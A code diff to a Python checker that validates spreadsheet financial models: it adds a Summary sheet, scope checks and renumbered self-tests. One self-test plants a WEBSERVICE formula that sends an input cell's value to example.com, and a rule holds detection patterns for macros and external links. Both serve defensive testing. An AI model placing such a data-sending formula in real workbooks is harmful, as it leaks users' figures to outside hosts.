@@ -7,9 +7,9 @@
 It reads the file itself (every formula, and the value stored next to it) and works it all out again. What "the
 way this skill writes it" means is not a list kept here: the workbook this skill would write for the same years is
 built again, and every cell of the file is compared with it.
-  K01  the workbook is laid out the way this skill lays it out: the six sheets, none hidden; every label, heading and
+  K01  the workbook is laid out the way this skill lays it out: the seven sheets, none hidden; every label, heading and
        line of the method word for word; every number shown in the format this skill gives it; and nothing on the
-       Assumptions or Charts sheet that this skill does not write there — the other rules need it
+       Assumptions, Summary or Monthly sales sheet that this skill does not write there — the other rules need it
   K02  no plugs: every cell of the statements and the checks holds exactly the formula this skill writes there, and
        nothing where it writes nothing — a number typed in, a constant written as a formula (=14400.30), or a formula
        edited to give the same total is a plug; an input on the Assumptions sheet is a plain number
@@ -46,7 +46,7 @@ A warning, not a finding: cash below zero, by more than half a penny, at the sta
 would need money it does not include).
 Exit 0 no findings · 1 findings · 2 usage or selftest failed.
 """
-import os, re, sys, zipfile
+import json, os, re, sys, zipfile
 from xml.etree import ElementTree as ET
 
 sys.dont_write_bytecode = True
@@ -62,10 +62,12 @@ STATEMENTS = ("Income statement", "Balance sheet", "Cash flow", "Checks")
 RANGE = {path: (lo, hi, words) for path, lo, hi, words in M.RANGES}
 
 
-def reference(n, first_year):
+def reference(n, first_year, currency=None):
     """what this skill writes for n years from first_year: {sheet: {ref: (kind, text or None, formula, format code)}},
     and the charts' specs. The inputs are the example's; the layout, the formulas and the formats do not depend on them."""
     b = dict(M.EXAMPLE, years=n, first_year=first_year)
+    if currency is not None:
+        b['currency'] = currency
     wb, _ = M.build(b)
     codes = {i: code for code, i in wb.styles.numfmts.items()}
     builtin = {1: "0", 2: "0.00", 3: "#,##0", 4: "#,##0.00", 9: "0%", 10: "0.00%"}
@@ -76,13 +78,13 @@ def reference(n, first_year):
             nf = wb.styles.xfs[st][3]
             cells[O.ref(r, c)] = (kind, value if kind == "s" else None, formula, codes.get(nf, builtin.get(nf, "General")))
         out[sh.name] = cells
-    charts = next(sh.charts for sh in wb.sheets if sh.name == "Charts")
+    charts = next(sh.charts for sh in wb.sheets if sh.name == "Summary")
     return out, charts
 
 
 def free_text(sheet, ref):
     """cells whose words come from the business (its name, description, currency, sources) rather than from this skill"""
-    return ref in ("A1", "A2") or (sheet == "Assumptions" and (ref == "A3" or (ref[0] == "C" and ref[1:].isdigit())))
+    return ref == "A1" or (ref == "A2" and sheet != 'Summary') or (sheet == 'Summary' and ref == 'A3') or (sheet == "Assumptions" and (ref in ("A3", "B53", "B54") or (ref[0] == "C" and ref[1:].isdigit())))
 
 
 def close(a, b):
@@ -105,11 +107,11 @@ def check_book(cells, parts):
 
     # K01 the layout
     if list(cells) != M.SHEETS:
-        add("K01", f"the sheets are {list(cells)}, not the six this skill writes ({', '.join(M.SHEETS)}) — not a model from this skill, or one rearranged")
+        add("K01", f"the sheets are {list(cells)}, not the seven this skill writes ({', '.join(M.SHEETS)}) — not a model from this skill, or one rearranged")
         return found, warn
     hidden = [s.get("name") for s in ET.fromstring(parts["xl/workbook.xml"]).iter("{%s}sheet" % O.NS) if s.get("state") in ("hidden", "veryHidden")]
     for name in hidden:
-        add("K01", f"the sheet {name} is hidden; this skill shows all six")
+        add("K01", f"the sheet {name} is hidden; this skill shows all seven")
     years = []
     c = 2
     while isinstance(val("Income statement", 3, c), str) and val("Income statement", 3, c).strip():
@@ -118,7 +120,11 @@ def check_book(cells, parts):
     if not 1 <= n <= 10:
         add("K01", f"the income statement has {n} year columns; this skill writes 1 to 10"); return found, warn
     first = int(years[0]) if years[0].isdigit() else 2000
-    ref_cells, ref_charts = reference(n, first)
+    currency_match = re.fullmatch(r'Year \((.{1,3}), rounded\)',str(val('Summary',5,1)))
+    business_line = val('Summary',2,1)
+    if not isinstance(business_line,str) or not business_line.strip() or len(business_line)>110 or '\n' in business_line or '\r' in business_line:
+        add('K01','Summary!A2 must describe the business in one line of at most 110 characters')
+    ref_cells, ref_charts = reference(n, first, currency_match[1] if currency_match else None)
     inputs = {f"B{row}" for row, _, _, _, _ in M.ASSUMPTIONS}
     trees = {}
     for sheet in M.SHEETS:
@@ -235,12 +241,30 @@ def check_book(cells, parts):
             node = node.setdefault(k, {})
         x = val("Assumptions", row, 2)
         lo, hi, words = RANGE[path]
-        if isinstance(x, bool) or not isinstance(x, (int, float)) or not lo <= x <= hi or (path == "funding.loan_years" and x != int(x)):
+        whole = path in ('funding.loan_years','equipment.useful_life','equipment.method','sales.mode')
+        if isinstance(x, bool) or not isinstance(x, (int, float)) or not lo <= x <= hi or (whole and x != int(x)):
             add("K06", f"Assumptions!B{row} ({label}) is {x!r}: the builder accepts {words} only between {lo:g} and {hi:g}"
-                       + (" and whole" if path == "funding.loan_years" else ""))
+                       + (" and whole" if whole else ""))
             usable = False
             continue
-        node[keys[-1]] = int(x) if path == "funding.loan_years" else x
+        node[keys[-1]] = int(x) if whole else x
+    try:
+        features = json.loads(val('Assumptions',53,2) or 'null')
+        scope = {'features': features, 'notes': val('Assumptions',54,2)}
+        errors = M.preflight({'description': val('Assumptions',2,1) or '', 'scope': scope})
+        if usable:
+            for feature, required in [('annual_sales',b['sales']['mode']==0), ('monthly_subscription',b['sales']['mode']==1),
+                                      ('straight_line',b['equipment']['method']==1), ('reducing_balance',b['equipment']['method']==0)]:
+                if (feature in features) != required:
+                    errors.append(('B04',f'{feature} does not agree with selected method'))
+            if b['sales']['mode']==1 and (b['sales']['units'] or b['sales']['unit_growth']):
+                errors.append(('B04','subscription must not hold unused annual units or unit growth'))
+            if b['sales']['mode']==0 and any(b['sales'][key] for key in ('opening_customers','monthly_additions','monthly_churn')):
+                errors.append(('B04','annual model holds subscription inputs it ignores'))
+        for _, message in errors:
+            add('K06','scope: '+message)
+    except (ValueError, TypeError):
+        add('K06','Assumptions!B53 must contain the assessed features as a JSON list')
     d = M.direct(b) if usable else None
     if d:
         pairs = [("Balance sheet", k, 0, d["start"][k]) for k in ("cash", "equip", "loan", "capital")]
@@ -275,6 +299,15 @@ def check_book(cells, parts):
     note = val("Assumptions", 3, 1) or ""
     if "not financial advice" not in note or not (note.startswith("Illustrative:") or note.startswith("Where the numbers come from:")):
         add("K08", "Assumptions!A3 should say whether the numbers are made up (\"Illustrative: …\") or where they come from, and that this is not financial advice")
+    if val('Summary',3,1) != note:
+        add('K08','Summary!A3 must repeat the honesty sentence from Assumptions!A3')
+    book = ET.fromstring(parts['xl/workbook.xml'])
+    view = book.find('{%s}bookViews/{%s}workbookView' % (O.NS,O.NS))
+    if view is None or view.get('activeTab','0') != '0':
+        add('K01','workbook must open on Summary')
+    for row, col, expected in [(6,M.ycol(i),v('Income statement','revenue',i)) for i in range(1,n+1)] + [(7,M.ycol(i),v('Income statement','net',i)) for i in range(1,n+1)] + [(8,M.ycol(i),v('Balance sheet','cash',i)) for i in range(1,n+1)] + [(9,2,min(cash)),(11,2,-min(cash) if min(cash)<-PENNY else 0)]:
+        if not close(val('Summary',row,col),expected):
+            add('K07',f'Summary!{O.ref(row,col)} does not agree with statements')
     # K09 macros, external links, embedded objects, hyperlinks, relationships that point outside the package
     for name in parts:
         if re.search(r"vbaProject|externalLink|activeX|embeddings/|\.bin$", name, re.I):
@@ -320,6 +353,8 @@ def check_book(cells, parts):
 
 
 def _label(sheet, row):
+    if sheet in ('Summary','Monthly sales'):
+        return f'row {row}'
     rows, labels = {"Income statement": (M.IS, M.IS_LABELS), "Balance sheet": (M.BS, M.BS_LABELS), "Cash flow": (M.CF, M.CF_LABELS), "Checks": (M.CK, M.CK_LABELS)}[sheet]
     return next((labels[k] for k, r in rows.items() if r == row), "?")
 
@@ -391,16 +426,16 @@ def selftest():
     b1, b2 = c(M.bcol(1)), c(M.bcol(2))
     case("clean", set(), built())
     case("K01 a sheet renamed", {"K01"}, built(edit=lambda wb: setattr(wb.sheets[3], "name", "Cashflow")))
-    case("K01 a row label changed", {"K01"}, built(edit=lambda wb: wb.sheets[1].set(M.IS["revenue"], 1, "Sales")))
-    case("K01 a seventh sheet added", {"K01"}, built(edit=lambda wb: wb.sheet("Notes")))
+    case("K01 a row label changed", {"K01"}, built(edit=lambda wb: wb.sheets[2].set(M.IS["revenue"], 1, "Sales")))
+    case("K01 an eighth sheet added", {"K01"}, built(edit=lambda wb: wb.sheet("Notes")))
     eleven = json.loads(json.dumps(E)); eleven["years"] = 11
     case("K01 eleven years (the skill writes 1 to 10)", {"K01"}, built(biz=eleven))
     def no_years(wb):
         for col in range(2, 2 + E["years"]):
-            wb.sheets[1].cells.pop((3, col), None)
+            wb.sheets[2].cells.pop((3, col), None)
     case("K01 no year columns on the income statement", {"K01"}, built(edit=no_years))
-    case("K01 an assumption's label changed", {"K01"}, built(edit=lambda wb: wb.sheets[0].set(6, 1, "Units sold", style="label")))
-    case("K01 year headers that disagree between statements", {"K01"}, built(edit=lambda wb: wb.sheets[2].set(3, M.bcol(3), "2030", style="headnum")))
+    case("K01 an assumption's label changed", {"K01"}, built(edit=lambda wb: wb.sheets[1].set(6, 1, "Units sold", style="label")))
+    case("K01 year headers that disagree between statements", {"K01"}, built(edit=lambda wb: wb.sheets[3].set(3, M.bcol(3), "2030", style="headnum")))
     case("K02 a number typed in where a formula belongs (a plug)", {"K02"}, built(edit=lambda wb: _plug(wb, "Balance sheet", f"{b2}{M.BS['cash']}")))
     case("K02 a formula outside what the checker can verify", {"K02"}, built(edit=lambda wb: _swap_formula(wb, "Income statement", f"{y1}{M.IS['revenue']}",
                                                                                                           f"PRODUCT({y1}{M.IS['units']},{y1}{M.IS['price']})")))
@@ -432,7 +467,7 @@ def selftest():
     def says_no(fx):
         fx[("Checks", M.CK["negative"], 2)] = '"No"'
     case("K07 a Checks sheet that says cash never goes below zero when it does", {"K02", "K07"}, built(bend=says_no, biz=broke))
-    case("K08 the not-advice sentence removed", {"K08"}, built(edit=lambda wb: wb.sheets[0].set(3, 1, "Illustrative: the numbers are made up.", style="note")))
+    case("K08 the not-advice sentence removed", {"K08"}, built(edit=lambda wb: wb.sheets[1].set(3, 1, "Illustrative: the numbers are made up.", style="note")))
     case("K09 a macro in the package", {"K09"}, built(zipped=lambda p: _zip_edit(p, None, lambda parts: dict(parts, **{"xl/vbaProject.bin": b"\x00macro"}))))
     case("K09 a hyperlink in a sheet", {"K09"}, built(zipped=lambda p: _zip_edit(p, "xl/worksheets/sheet1.xml",
                                                                           lambda blob: blob.replace(b"<pageMargins", b'<hyperlinks><hyperlink ref="A1" display="x"/></hyperlinks><pageMargins', 1))))
@@ -440,7 +475,7 @@ def selftest():
                                                                                            lambda blob: blob.replace(b"<c:v>108000</c:v>", b"<c:v>99000</c:v>", 1))))
     case("K10 a chart series that points at no cells", {"K10"}, built(zipped=lambda p: _zip_edit(p, "xl/charts/chart2.xml",
                                                                                          lambda blob: __import__("re").sub(rb"<c:val><c:numRef><c:f>[^<]*</c:f>", b"<c:val><c:numRef>", blob, count=1))))
-    case("K11 an icon in the description", {"K11"}, built(edit=lambda wb: wb.sheets[0].set(2, 1, E["description"] + " \U0001f6b2", style="note")))
+    case("K11 an icon in the description", {"K06", "K11"}, built(edit=lambda wb: wb.sheets[1].set(2, 1, E["description"] + " \U0001f6b2", style="note")))
     case("a business whose cash goes below zero: no finding, one warning", set(), built(biz=broke),
          extra=lambda found, warn: len(warn) == 1 and "below zero" in warn[0])
     even = json.loads(json.dumps(E)); even["funding"].update(equity=17129.37, loan=10590.9); even["equipment"]["initial"] = 27720.27
@@ -466,12 +501,12 @@ def selftest():
         old = next(k for k in codes if k.startswith("#,##0;(#,##0)"))
         codes['#,##0;#,##0;"\u2013"'] = codes.pop(old)
     case("K01 losses shown without their brackets", {"K01"}, built(edit=no_sign))
-    case("K01 a line of the method rewritten", {"K01"}, built(edit=lambda wb: wb.sheets[0].set(34, 1, "Depreciation is straight-line over five years.", style="text")))
-    case("K01 a formula added beside the inputs", {"K01"}, built(edit=lambda wb: wb.sheets[0].set(6, 4, 0, formula='WEBSERVICE("https://example.com/?p="&B8)')))
+    case("K01 a line of the method rewritten", {"K01"}, built(edit=lambda wb: wb.sheets[1].set(34, 1, "Depreciation is straight-line over five years.", style="text")))
+    case("K01 a formula added beside the inputs", {"K01"}, built(edit=lambda wb: wb.sheets[1].set(6, 4, 0, formula='WEBSERVICE("https://example.com/?p="&B8)')))
     case("K02 a plug written as a formula", {"K02"}, built(edit=lambda wb: _swap_formula(wb, "Balance sheet", f"{b1}{M.BS['cash']}",
-                                                                                       O.number_text(wb.sheets[2].cells[O.split_ref(f"{b1}{M.BS['cash']}")][1]))))
+                                                                                       O.number_text(wb.sheets[3].cells[O.split_ref(f"{b1}{M.BS['cash']}")][1]))))
     def openings(wb):
-        wb.sheets[2].set(M.BS["recv"], 2, 1000, style="money"); wb.sheets[2].set(M.BS["retained"], 2, 1000, style="money")
+        wb.sheets[3].set(M.BS["recv"], 2, 1000, style="money"); wb.sheets[3].set(M.BS["retained"], 2, 1000, style="money")
     case("K02 opening balances typed into the blank start cells", {"K02", "K03", "K04", "K05"}, built(edit=openings))
     case("K02 an input written as a formula", {"K02"}, built(edit=lambda wb: _swap_formula(wb, "Assumptions", "B6", "2400")))
     def same_totals(fx):
@@ -484,17 +519,17 @@ def selftest():
         def edit(blob):
             import re as _re
             text = blob.decode("utf-8")
-            f1 = _re.search(r'<c r="C4"[^>]*><f>([^<]*)</f>', text).group(1)
-            text = text.replace(f'<f>{f1}</f>', f'<f t="shared" ref="C4:D4" si="0">{f1}</f>', 1)
-            f2 = _re.search(r'<c r="D4"[^>]*><f>([^<]*)</f>', text).group(1)
+            f1 = _re.search(r'<c r="C5"[^>]*><f>([^<]*)</f>', text).group(1)
+            text = text.replace(f'<f>{f1}</f>', f'<f t="shared" ref="C5:D5" si="0">{f1}</f>', 1)
+            f2 = _re.search(r'<c r="D5"[^>]*><f>([^<]*)</f>', text).group(1)
             return text.replace(f'<f>{f2}</f>', '<f t="shared" si="0"/>', 1).encode("utf-8")
-        _zip_edit(p, "xl/worksheets/sheet2.xml", edit)
+        _zip_edit(p, "xl/worksheets/sheet3.xml", edit)
     case("clean: a run of formulas stored the way Excel shares them", set(), built(zipped=shared))
     fast = json.loads(json.dumps(E)); fast["equipment"]["depreciation_rate"] = 1.5
     case("K06 an input the builder would refuse (depreciation at 150%)", {"K06"}, built(biz=fast))
     def zero_years(p):
         import re as _re
-        _zip_edit(p, "xl/worksheets/sheet1.xml", lambda blob: _re.sub(rb'(<c r="B27"[^>]*>)<v>[^<]*</v>', rb"\g<1><v>0</v>", blob, count=1))
+        _zip_edit(p, "xl/worksheets/sheet2.xml", lambda blob: _re.sub(rb'(<c r="B27"[^>]*>)<v>[^<]*</v>', rb"\g<1><v>0</v>", blob, count=1))
     case("K06 the loan's years typed as 0", {"K03", "K06"}, built(zipped=zero_years))
     def outside(p):
         def rels(parts):
@@ -509,9 +544,9 @@ def selftest():
             return blob.replace(b"<c:v>Revenue</c:v>", b"<c:v>@@</c:v>", 1).replace(b"<c:v>Net profit</c:v>", b"<c:v>Revenue</c:v>", 1).replace(b"<c:v>@@</c:v>", b"<c:v>Net profit</c:v>", 1)
         _zip_edit(p, "xl/charts/chart1.xml", edit)
     case("K10 a chart's two series under each other's names", {"K10"}, built(zipped=swapped))
-    case("K01 a heading replaced by a number", {"K01"}, built(edit=lambda wb: wb.sheets[2].set(3, 2, 0, style="headnum")))
+    case("K01 a heading replaced by a number", {"K01"}, built(edit=lambda wb: wb.sheets[3].set(3, 2, 0, style="headnum")))
     case("K10 a chart missing from the file", {"K10"}, built(zipped=lambda p: _zip_edit(p, None, lambda parts: {k: v for k, v in parts.items() if k != "xl/charts/chart2.xml"})))
-    case("K11 an emoji punctuation mark in the description", {"K11"}, built(edit=lambda wb: wb.sheets[0].set(2, 1, E["description"] + " \u203c", style="note")))
+    case("K11 an emoji punctuation mark in the description", {"K06", "K11"}, built(edit=lambda wb: wb.sheets[1].set(2, 1, E["description"] + " \u203c", style="note")))
     print(f"model_check selftest: {sum(ok)}/{len(ok)} passed")
     return 0 if all(ok) else 2
 
